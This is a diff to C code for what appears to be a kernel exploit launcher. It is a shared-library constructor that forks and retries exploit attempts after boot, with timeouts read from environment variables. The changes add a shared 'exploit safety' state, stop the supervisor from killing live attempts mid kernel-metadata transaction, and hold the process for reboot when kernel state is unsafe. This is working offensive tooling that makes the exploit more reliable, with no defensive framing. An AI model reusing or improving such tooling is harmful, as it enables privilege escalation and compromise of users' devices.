@@ -16,6 +16,14 @@
 #endif
 #define APP_MIN_BOOT_UPTIME_SEC 120
 
+atomic_int *exploit_safety_shared;
+
+void mark_exploit_safety(int state) {
+  if (exploit_safety_shared) {
+    atomic_store(exploit_safety_shared, state);
+  }
+}
+
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 struct app_p0_shared_state {
   atomic_int dirty;
@@ -64,7 +72,8 @@ static int env_int(const char *name, int fallback, int min, int max) {
 }
 
 static int attempt_delay_usec(int base_delay, int attempt) {
-#if defined(APP_PAYLOAD_ATTEMPT_DELAYS_USEC)
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_PAYLOAD_ATTEMPT_DELAYS_USEC)
   static const int delays[] = {
     APP_PAYLOAD_ATTEMPT_DELAYS_USEC
   };
@@ -111,12 +120,21 @@ __attribute__((constructor)) static void load(void) {
   set_unbuffer();
   wait_for_boot_quiet_window();
 
+  exploit_safety_shared = mmap(NULL, sizeof(*exploit_safety_shared),
+                               PROT_READ | PROT_WRITE,
+                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (exploit_safety_shared == MAP_FAILED) {
+    exploit_safety_shared = NULL;
+    pr_error("exploit safety state mmap failed errno=%d\n", errno);
+  }
+  atomic_init(exploit_safety_shared, EXPLOIT_SAFETY_CLEAN);
+
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
-      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
+      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 7200);
   int p0_attempt_timeout_sec = env_int(
       "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
       attempt_timeout_sec);
@@ -145,6 +163,14 @@ __attribute__((constructor)) static void load(void) {
              attempt_timeout_sec);
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (atomic_load(exploit_safety_shared) != EXPLOIT_SAFETY_CLEAN) {
+      pr_warning("exploit supervisor found unsafe state before attempt=%d; "
+                 "holding for reboot\n", attempt);
+      fflush(NULL);
+      for (;;) {
+        sleep(60);
+      }
+    }
     int delay_usec = attempt_delay_usec(base_delay, attempt);
     pid_t child = SYSCHK(fork());
     if (child == 0) {
@@ -174,8 +200,15 @@ __attribute__((constructor)) static void load(void) {
 
     int status = 0;
     pid_t waited = 0;
+    int unsafe_timeout_reported = 0;
     struct timespec started;
-    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
+    int supervisor_clock_valid =
+        clock_gettime(CLOCK_MONOTONIC, &started) == 0;
+    if (!supervisor_clock_valid) {
+      pr_warning("supervisor start clock unavailable errno=%d; timeout "
+                 "disabled while waiting for child=%d\n",
+                 errno, child);
+    }
     for (;;) {
       waited = waitpid(child, &status, WNOHANG);
       if (waited == child) {
@@ -186,8 +219,16 @@ __attribute__((constructor)) static void load(void) {
       }
 
       struct timespec now;
-      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
-      time_t elapsed = now.tv_sec - started.tv_sec;
+      if (supervisor_clock_valid &&
+          clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
+        supervisor_clock_valid = 0;
+        pr_warning("supervisor poll clock unavailable errno=%d; timeout "
+                   "disabled while waiting for child=%d\n",
+                   errno, child);
+      }
+      time_t elapsed = supervisor_clock_valid
+                           ? now.tv_sec - started.tv_sec
+                           : 0;
       int timeout_sec = attempt_timeout_sec;
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       if (!getenv("SLIDE_P0_OFFSET") &&
@@ -195,20 +236,44 @@ __attribute__((constructor)) static void load(void) {
         timeout_sec = p0_attempt_timeout_sec;
       }
 #endif
-      if (elapsed >= timeout_sec) {
-        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
-                   attempt, max_attempts, child, timeout_sec);
-        SYSCHK(kill(child, SIGKILL));
-        do {
-          waited = waitpid(child, &status, 0);
-        } while (waited < 0 && errno == EINTR);
-        break;
+      if (supervisor_clock_valid && elapsed >= timeout_sec) {
+        /*
+         * Never kill a live exploit attempt from the supervisor.  A
+         * check-then-kill sequence has an unavoidable race with the child
+         * beginning a kernel-metadata transaction immediately after the
+         * safety check.  Keep the owner and all backing references alive;
+         * recovery from a genuine hang is a device reboot.
+         */
+        if (!unsafe_timeout_reported) {
+          int safety = atomic_load(exploit_safety_shared);
+          pr_warning("exploit attempt=%d/%d timeout suppressed pid=%d "
+                     "seconds=%d safety=%d; waiting for completion or "
+                     "reboot\n",
+                     attempt, max_attempts, child, timeout_sec, safety);
+          unsafe_timeout_reported = 1;
+        }
+        usleep(100000);
+        continue;
       }
       usleep(100000);
     }
     if (waited < 0) {
-      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
-               attempt, child, errno);
+      pr_warning("waitpid attempt=%d pid=%d errno=%d; retaining supervisor "
+                 "and child until reboot\n",
+                 attempt, child, errno);
+      mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
+      for (;;) {
+        sleep(60);
+      }
+    }
+    if (atomic_load(exploit_safety_shared) != EXPLOIT_SAFETY_CLEAN) {
+      pr_warning("exploit child exited with unsafe kernel state=%d; "
+                 "refusing retry and holding for reboot\n",
+                 atomic_load(exploit_safety_shared));
+      fflush(NULL);
+      for (;;) {
+        sleep(60);
+      }
     }
     if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
       pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
